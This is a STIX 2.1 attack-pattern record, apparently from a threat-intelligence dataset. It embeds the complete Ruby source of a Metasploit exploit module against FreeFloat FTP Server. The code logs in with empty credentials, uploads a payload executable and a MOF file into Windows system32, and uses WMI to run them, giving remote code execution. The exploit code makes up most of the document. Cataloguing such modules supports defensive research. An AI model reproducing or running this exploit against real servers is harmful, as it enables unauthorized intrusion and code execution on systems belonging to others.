{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e68f7c6c-1ea6-4f1b-b4cf-8b9505e8f717",
    "created": "2024-08-14T16:51:16.520783Z",
    "modified": "2024-08-14T16:51:16.520787Z",
    "name": "\"FreeFloat FTP Server Arbitrary File Upload\"",
    "description": " This module abuses multiple issues in FreeFloat: 1. No credential is actually needed to login; 2. User's default path is in C:\\, and this cannot be changed; 3. User can write to anywhere on the server's file system.  As a result of these poor implementations, a malicious user can just log in and then upload files and let WMI (Management Instrumentation service) to execute the payload uploaded.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/freefloatftp_wbem.rb",
            "external_id": "freefloatftp_wbem.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"FreeFloat FTP Server Arbitrary File Upload\",\n      'Description'    => %q{\n          This module abuses multiple issues in FreeFloat: 1. No credential is actually\n        needed to login; 2. User's default path is in C:\\, and this cannot be changed;\n        3. User can write to anywhere on the server's file system.  As a result of these\n        poor implementations, a malicious user can just log in and then upload files,\n        and let WMI (Management Instrumentation service) to execute the payload uploaded.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r', # Vulnerability discovery, Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '88302'],\n          ['OSVDB', '88303']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['FreeFloat', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-12-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        # Change the default description so this option makes sense\n        OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])\n      ])\n\n    deregister_options('FTPUSER', 'FTPPASS') # Using empty user and password\n  end\n\n\n  def check\n    connect\n    disconnect\n\n    if banner =~ /FreeFloat/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def on_client_connect(cli)\n    peer = \"#{cli.peerhost}:#{cli.peerport}\"\n\n    case @stage\n    when :exe\n      print_status(\"Sending executable (#{@exe.length.to_s} bytes)\")\n      cli.put(@exe)\n      @stage = :mof\n\n    when :mof\n      print_status(\"Sending MOF (#{@mof.length.to_s} bytes)\")\n      cli.put(@mof)\n    end\n\n    cli.close\n  end\n\n\n  def upload(filename)\n    select(nil, nil, nil, 1)\n\n    peer = \"#{rhost}:#{rport}\"\n    print_status(\"Trying to upload #{::File.basename(filename)}\")\n\n    conn = connect(false, datastore['VERBOSE'])\n\n    print_status(\"Sending empty login...\")\n\n    res = send_user(\"\", conn)\n    if not res or res !~ /331/\n      print_error(\"Error sending username\")\n      return false\n    end\n\n    res = send_pass(\"\", conn)\n    if not res or res !~ /230/\n      print_error(\"Error sending password\")\n      return false\n    end\n\n    print_good(\"Empty authentication was successful\")\n\n    # Switch to binary mode\n    print_status(\"Set binary mode\")\n    send_cmd(['TYPE', 'I'], true, conn)\n\n    # Prepare active mode: Get attacker's IP and source port\n    src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']\n    src_port = datastore['SRVPORT'].to_i\n\n    # Prepare active mode: Convert the IP and port for active mode\n    src_ip   = src_ip.gsub(/\\./, ',')\n    src_port = \"#{src_port/256},#{src_port.remainder(256)}\"\n\n    # Set to active mode\n    print_status(\"Set active mode \\\"#{src_ip},#{src_port}\\\"\")\n    send_cmd(['PORT', \"#{src_ip},#{src_port}\"], true, conn)\n\n    # Tell the FTP server to download our file\n    send_cmd(['STOR', filename], false, conn)\n\n    disconnect(conn)\n  end\n\n\n  def exploit\n\n    exe_name = \"WINDOWS/system32/#{rand_text_alpha(rand(10)+5)}.exe\"\n    mof_name = \"WINDOWS/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.mof\"\n    @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))\n    @exe      = generate_payload_exe\n    @stage = :exe\n\n    begin\n      t = framework.threads.spawn(\"reqs\", false) {\n        begin\n          # Upload our malicious executable\n          u = upload(exe_name)\n          # Upload the mof file\n          upload(mof_name) if u\n          register_file_for_cleanup(\"#{::File.basename(exe_name)}\")\n          register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{::File.basename(mof_name)}\")\n        rescue ::Exception => e\n          print_error \"Upload Failed: #{e.message}\"\n          cleanup\n        end\n      }\n      super\n    ensure\n      t.kill\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-07",
    "x_mitre_platforms": [
        "win'"
    ]
}